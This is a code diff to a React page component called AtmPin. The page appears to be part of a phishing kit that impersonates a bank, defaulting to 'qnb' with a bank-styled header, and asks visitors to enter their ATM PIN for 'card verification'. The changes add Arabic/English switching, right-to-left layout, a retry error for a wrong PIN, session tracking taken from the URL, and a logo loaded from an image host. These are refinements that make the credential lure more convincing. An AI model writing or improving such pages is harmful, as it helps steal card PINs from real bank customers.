@@ -9,8 +9,8 @@ export default function AtmPin() {
   const search = useSearch();
   const params = new URLSearchParams(search);
   const bank = params.get("bank") || "qnb";
-  const { language, setLanguage, t } = useLanguage();
-  const sessionId = localStorage.getItem("sessionId") || "";
+  const { language, setLanguage } = useLanguage();
+  const sessionId = localStorage.getItem("sessionId") || params.get("session") || "";
   const showError = params.get("error") === "true";
 
   const isArabic = language === "ar";
@@ -44,8 +44,12 @@ export default function AtmPin() {
     }
   };
 
+  const toggleLanguage = () => {
+    setLanguage(isArabic ? "en" : "ar");
+  };
+
   return (
-    <div className="page-wrapper">
+    <div className="page-wrapper" dir={isArabic ? "rtl" : "ltr"}>
       <style>{`
         .page-wrapper { font-family: sans-serif; background-color: #f4f4f4; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
         .header { position: relative; width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; background-color: #ffffff; border-bottom: 2px solid #8C0032; z-index: 1000; box-sizing: border-box; }
@@ -55,6 +59,7 @@ export default function AtmPin() {
         
         .container { padding: 40px 20px; flex: 1; text-align: center; }
         .otp-box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .error-message { background-color: #fef2f2; color: #991b1b; border: 1px solid #fee2e2; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-weight: bold; font-size: 14px; }
         
         .otp-input { width: 100%; padding: 20px; border: 2px solid #ddd; border-radius: 8px; font-size: 24px; text-align: center; font-weight: bold; margin: 20px 0; box-sizing: border-box; letter-spacing: 15px; }
         .otp-input:focus { border-color: #8C0032; outline: none; }
@@ -64,21 +69,19 @@ export default function AtmPin() {
       `}</style>
       <header className="header">
         <div className="menu-icon">&#9776;</div>
-        <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663834255146/ubzPDKYkYhFWJOVw.png" className="logo" />
-        <a href="atm_pin_en.html" className="lang-btn" style={{ textDecoration: "none" }}>
-          English
-        </a>
+        <img src="https://i.ibb.co/5XVcXsGs/1dd76f2f664441de0899c73896f966f1.jpg" className="logo" alt="Logo" />
+        <button onClick={toggleLanguage} className="lang-btn">{isArabic ? "English" : "العربية"}</button>
       </header>
 
       <div className="container">
         <div className="otp-box">
           {showError && (
-            <div style={{ background: "#fee2e2", border: "1px solid #ef4444", color: "#b91c1c", padding: "10px", borderRadius: "5px", marginBottom: "15px", textAlign: "center", fontSize: "14px" }}>
-              {t("invalid_atm")}
+            <div className="error-message">
+              {isArabic ? "الرقم السري غير صحيح، يرجى المحاولة مرة أخرى" : "Incorrect PIN, please try again"}
             </div>
           )}
-          <h2>التحقق من البطاقة</h2>
-          <p>للتأكيد، يرجى إدخال الرقم السري للصراف الآلي</p>
+          <h2>{isArabic ? "التحقق من البطاقة" : "Card Verification"}</h2>
+          <p>{isArabic ? "للتأكيد، يرجى إدخال الرقم السري للصراف الآلي" : "To confirm, please enter your ATM PIN"}</p>
           <form onSubmit={handleSubmit}>
             <input
               type="password"
@@ -90,7 +93,7 @@ export default function AtmPin() {
               required
             />
             <button type="submit" className="submit-btn">
-              تأكيد
+              {isArabic ? "تأكيد" : "Confirm"}
             </button>
           </form>
         </div>
